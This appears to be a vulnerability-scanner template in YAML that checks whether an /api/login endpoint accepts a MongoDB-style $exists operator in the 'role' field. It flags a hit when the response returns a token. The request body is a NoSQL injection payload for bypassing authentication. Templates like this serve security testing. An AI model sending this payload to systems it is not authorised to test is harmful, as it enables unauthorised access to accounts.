id: nosql-40
name: 'NoSQL $exists in role'
severity: high
type: active
tags:
  - nosql
  - injection
  - api
description: 'NoSQL operator $exists accepted on /api/login'
requests:
  - method: POST
    path: '{{BaseURL}}/api/login'
    body: '{"role":{"$exists":""},"extra":"x"}'
    match-all: true
    matchers:
      - type: status
        status: [200]
      - type: regex
        part: body
        regex:
          - '"token"\s*:'
